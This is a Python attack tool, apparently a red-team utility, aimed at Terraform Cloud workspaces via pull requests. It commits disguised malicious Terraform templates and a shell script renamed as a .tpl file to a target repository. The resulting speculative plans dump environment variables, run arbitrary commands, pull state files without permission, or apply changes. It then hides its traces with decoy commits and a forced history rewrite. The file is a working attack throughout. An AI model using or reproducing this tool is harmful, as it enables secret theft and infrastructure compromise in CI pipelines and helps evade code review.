### Variable Info ###
# the "repo" argument is the git repo of a TF workspace that is going to be cloned and targeted by these attacks
# the "folder" argument is the name of the directory within the git repo that holds the .tf files
# "tmp folder" is the parent directory where the targeted repository is being cloned to.
# So the full path looks something like:
#       .../tmp/repo/folder 
###

import argparse
import os
import subprocess
from string import Template
import tempfile
import shutil
import sys
import re

# This will be the name of the temporal branch used to commit the malicious code
TMP_BRANCH = "SEC-0000"
SCRIPT_PATH = ""

def get_script_path():
    return os.path.dirname(os.path.realpath(sys.argv[0]))

# It checks if the git binary is present in the system
def check_git_binary():
    try:
        output = subprocess.getoutput("git --version")
        print("[+] Found git client, %s" % output.split('\n')[0])
        return True
    except FileNotFoundError as f:
        return False

# It creates a temporal folder that will be used to clone the target repository and add the malicious tf code
def setup_temp_folder(repo):
    tmp_folder = tempfile.mkdtemp()
    print(f"[+] Created temporal folder {tmp_folder}")

    # First we clone the repository
    print(f"[+] Cloning repository {repo}")
    output = subprocess.getoutput(f"git clone --progress {repo} {tmp_folder}")
    
    if not "done" in output:
        print(f"[!] It seems like there is some issue cloning the repo you provided, check it manually:\ngit clone {repo}")
        shutil.rmtree(tmp_folder)
        exit(-1)

    # Second, we create a branch to add the malicious files
    print(f"[+] Creating branch {TMP_BRANCH}")
    os.chdir(tmp_folder)
    output = subprocess.getoutput(f"git branch -a")
    if re.search(TMP_BRANCH, output) != None:
        print(f"[!] {TMP_BRANCH} already exists, you can delete it with the following command:")
        print(f"cd {tmp_folder}; git push origin --delete {TMP_BRANCH}; cd -")
        #TODO: Remove this
        subprocess.getoutput(f"cd {tmp_folder}; git push origin --delete {TMP_BRANCH}; cd -")
        #exit(-1)
    subprocess.getoutput(f"git checkout -b {TMP_BRANCH}")
    
    return tmp_folder

# Attack 1 - exfil all env vars into TF plan results
# TODO - add option to exfil to an external host
def get_all_envs(tmp_folder, terraform_folder):
    # Copying template to temp folder
    src_file = os.path.join(SCRIPT_PATH, "templates/get_all_envs.tf")
    # We use a name that is generic but unique
    dst_file = os.path.join(tmp_folder, terraform_folder, "template_instance000.tf")
    print(f"[+] Copying template file from {src_file} to {dst_file}")
    shutil.copy(src_file, dst_file) 
    # We add the file performing the attack
    print("[+] Commiting get_all_envs locally")
    output = subprocess.getoutput("git add " + os.path.join(terraform_folder, "template_instance000.tf"))
    output = subprocess.getoutput("git commit -m 'Testing TF plan for template instance'")
    print("[+] Pushing get_all_envs commit to origin")
    output = subprocess.getoutput("git push origin " + TMP_BRANCH)
    url_pr = re.search(f"http.*{TMP_BRANCH}", output).group(0)
    return url_pr

def exec_command(tmp_folder, terraform_folder, command):
    # Copying template to temp folder
    src_file = os.path.join(SCRIPT_PATH, "templates/exec_command.tf")
    # We use a name that is generic but unique
    dst_file = os.path.join(tmp_folder, terraform_folder, "template_instance001.tf")
    print(f"[+] Copying template file from {src_file} to {dst_file}")
    shutil.copy(src_file, dst_file) 
    
    s = Template(open(dst_file, "r").read())
    template_filled = s.substitute(command=command)
    open(dst_file, "w").write(template_filled)

    # We add the file performing the attack
    print("[+] Commiting the template locally")
    output = subprocess.getoutput("git add " + os.path.join(terraform_folder, "template_instance001.tf"))
    output = subprocess.getoutput("git commit -m 'Testing TF plan for template instance'")
    print("[+] Pushing exec_command commit to origin")
    output = subprocess.getoutput("git push origin " + TMP_BRANCH)
    url_pr = re.search(f"http.*{TMP_BRANCH}", output).group(0)
    return url_pr

def apply_on_plan(tmp_folder, terraform_folder):
    # Copying template to execute a command
    src_file = os.path.join(SCRIPT_PATH, "templates/exec_command.tf")
    # We use a name that is generic but unique
    dst_file = os.path.join(tmp_folder, terraform_folder, "template_instance002.tf")
    print(f"[+] Copying template file from {src_file} to {dst_file}")
    shutil.copy(src_file, dst_file) 

    s = Template(open(dst_file, "r").read())
    # The command we will run is a bash script
    template_filled = s.substitute(command="bash instance.tpl")
    open(dst_file, "w").write(template_filled)
   
    # We add the "malicious tf file" with an AWS S3 bucket
    src_file = os.path.join(SCRIPT_PATH, "templates/s3_bucket.tf")
    dst_file = os.path.join(tmp_folder, terraform_folder, "template_instance003")
    print(f"[+] Copying template file from {src_file} to {dst_file}")
    shutil.copy(src_file, dst_file) 
 
    # We add the bash script that performs the apply
    # Pretend the malicious script is a .tpl file
    src_file = os.path.join(SCRIPT_PATH, "templates/apply_on_plan.sh")
    dst_file = os.path.join(tmp_folder, terraform_folder, "instance.tpl")
    print(f"[+] Copying template file from {src_file} to {dst_file}")
    shutil.copy(src_file, dst_file) 

    # We add the file performing the attack
    print("[+] Commiting the template locally")
    output = subprocess.getoutput("git add " + os.path.join(terraform_folder, "template_instance002.tf"))
    output = subprocess.getoutput("git add " + os.path.join(terraform_folder, "template_instance003"))
    output = subprocess.getoutput("git add " + os.path.join(terraform_folder, "instance.tpl"))
    output = subprocess.getoutput("git commit -m 'Testing TF plan for template instance'")
    print("[+] Pushing apply_on_plan commit to origin")
    output = subprocess.getoutput("git push origin " + TMP_BRANCH)
    url_pr = re.search(f"http.*{TMP_BRANCH}", output).group(0)
    return url_pr

def get_state_file(tmp_folder, terraform_folder, workspace=None):
    # Copying template to execute a command
    src_file = os.path.join(SCRIPT_PATH, "templates/exec_command.tf")
    # We use a name that is generic but unique
    dst_file = os.path.join(tmp_folder, terraform_folder, "template_instance002.tf")
    print(f"[+] Copying template file from {src_file} to {dst_file}")
    shutil.copy(src_file, dst_file) 

    s = Template(open(dst_file, "r").read())
    # The command we will run is a bash script
    if workspace != None:
        command = f"bash instance.tpl {workspace}"
        template_filled = s.substitute(command=command)
    else:
        template_filled = s.substitute(command="bash instance.tpl")
    open(dst_file, "w").write(template_filled)

    # We add the bash script that performs the tf statefile exfil
    # Pretend the malicious script is a .tpl file
    src_file = os.path.join(SCRIPT_PATH, "templates/retrieve_state_file.sh")
    dst_file = os.path.join(tmp_folder, terraform_folder, "instance.tpl")
    print(f"[+] Copying template file from {src_file} to {dst_file}")
    shutil.copy(src_file, dst_file) 

    # We add the file performing the attack
    print("[+] Commiting the template locally")
    output = subprocess.getoutput("git add " + os.path.join(terraform_folder, "template_instance002.tf"))
    output = subprocess.getoutput("git add " + os.path.join(terraform_folder, "instance.tpl"))
    output = subprocess.getoutput("git commit -m 'Testing TF plan for template instance'")
    print("[+] Pushing apply_on_plan commit to origin")
    output = subprocess.getoutput("git push origin " + TMP_BRANCH)
    url_pr = re.search(f"http.*{TMP_BRANCH}", output).group(0)
    return url_pr

# To be a bit more sneaky we commit a couple times so it's not as easy to see the malicious code in the PR
def rewrite_history(tmp_folder):
    # First commit
    fake_template = """
resource "aws_ec2_host" "template_instance" {
  instance_type     = "c5.large"
  availability_zone = "us-west-2a"
}
"""
    open("nullprovider/template_instance000.tf", "w").write(fake_template)
    subprocess.getoutput("git add nullprovider/template_instance000.tf")
    subprocess.getoutput("git commit -m 'Adding EC2 template'")
    print("[+] Pushing one commit replacing the malicious template")
    subprocess.getoutput("git push origin SEC-0000")

    # Second commit
    fake_template = """
resource "aws_ec2_host" "template_instance" {
  instance_type     = "c4.large"
  availability_zone = "us-west-2a"
}
"""
    open("nullprovider/template_instance000.tf", "w").write(fake_template)
    subprocess.getoutput("git add nullprovider/template_instance000.tf")
    subprocess.getoutput("git commit -m 'Changing instance size to c4'")
    print("[+] Pushing one commit with a fake fix")
    subprocess.getoutput("git push origin SEC-0000")

    # Reset HEAD and force push to rewrite history
    subprocess.getoutput("git fetch origin && git reset --hard origin/main")
    print("[+] Rewriting history, this will automatically close the PR")
    subprocess.getoutput("git push --force origin SEC-0000")

def parse_args():
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument('--repo', type=str, help="Github repository (SSH url) that is going to be targeted", required=True)
    arg_parser.add_argument('--folder', type=str, help="Folder in the repo that contains the terraform files where you wish the attack to take place", required=True)
    attack = arg_parser.add_mutually_exclusive_group(required=True)
    attack.add_argument('--get_envs', action='store_true', help="This retrieves the environment variables from a TF workspaces")
    attack.add_argument('--get_state_file', action='store_true', help="This retrieves the state file of the current TF workspace through a TF plan; useful when the user doesn't have permissions to access the state file")
    attack.add_argument('--get_state_file_from_workspace', type=str, help="This retrieves the state file of a supplied workspace name through a TF plan; useful when the user doesn't have permissions to access the state file")
    attack.add_argument('--exec_command', type=str, help="Runs a command in the container used to run the speculative plan, useful to access TFC infra and access Cloud metadata if misconfigured")    
    attack.add_argument('--apply_on_plan', action='store_true', help="")    
    return arg_parser.parse_args()

def main():
    args = parse_args()
    global SCRIPT_PATH
    SCRIPT_PATH = get_script_path()
    if not check_git_binary():
        print("git binary not found in your system")
        exit(-1)

    # Create a temp folder to use it during the attack
    tmp_folder = setup_temp_folder(args.repo)

    if args.get_envs:
        url_pr = get_all_envs(tmp_folder, args.folder)
    elif args.exec_command:
        url_pr = exec_command(tmp_folder, args.folder, args.exec_command)
    elif args.apply_on_plan:
        url_pr = apply_on_plan(tmp_folder, args.folder)
    elif args.get_state_file:
        url_pr = get_state_file(tmp_folder, args.folder)
    elif args.get_state_file_from_workspace:
        url_pr = get_state_file(tmp_folder, args.folder, args.get_state_file_from_workspace)
    
    # Show to the user the URL to create a Github PR
    print("[!] Visit the following URL to complete the PR that will trigger the TF attack")
    if args.get_envs or args.exec_command: 
        print("[!] Once the PR is created, view the TF plan results for your environment variables")
    print(url_pr)
    
    # ToDo: Tell the user to check for the output
    # ToDo : Ask user if he/she wants to rewrite history to delete what we did
    # (Do that only after the PR has been submmited)
    answer = input("Press any key when you have finished the plan to begin cleanup") 
    rewrite_history(tmp_folder)

    # Remove temporal folder
    shutil.rmtree(tmp_folder)

if __name__ == "__main__":
    main()